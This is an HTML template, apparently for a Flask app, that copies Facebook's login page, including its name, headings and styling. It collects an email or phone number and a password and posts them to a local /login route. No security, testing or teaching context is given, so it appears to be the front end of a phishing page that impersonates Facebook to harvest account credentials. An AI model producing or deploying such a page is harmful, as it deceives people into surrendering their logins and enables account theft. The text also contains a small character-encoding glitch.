<!DOCTYPE html>
<html>
<head>
    <title>Facebook Login</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-100 flex items-center justify-center min-h-screen">
    <div class="text-center">
        <h1 class="text-5xl font-bold text-blue-600 mb-8">facebook</h1>
        <div class="bg-white p-8 rounded-lg shadow-lg max-w-sm w-full">
            <h2 class="text-xl font-semibold mb-6">Log in to Facebook</h2>
            {% if get_flashed_messages() %}
                <div class="bg-yellow-100 border border-yellow-400 text-yellow-700 px-4 py-3 rounded mb-4">
                    {% for message in get_flashed_messages() %}
                        {{ message }}
                    {% endfor %}
                </div>
            {% endif %}
            <form action="/login" method="POST">
                <div class="mb-4">
                    <input type="text" name="email" placeholder="Email address or phone number" class="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-600" required>
                </div>
                <div class="mb-6">
                    <input type="password" name="password" placeholder="Password" class="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-600" required>
                </div>
                <button type="submit" class="w-full bg-blue-600 text-white p-3 rounded-lg font-semibold hover:bg-blue-700">Log in</button>
            </form>
            <div class="mt-6 text-sm">
                <a href="#" class="text-blue-600 hover:underline">Forgotten account?</a> Â· <a href="#" class="text-blue-600 hover:underline">Sign up for Facebook</a>
            </div>
        </div>
    </div>
</body>
</html>
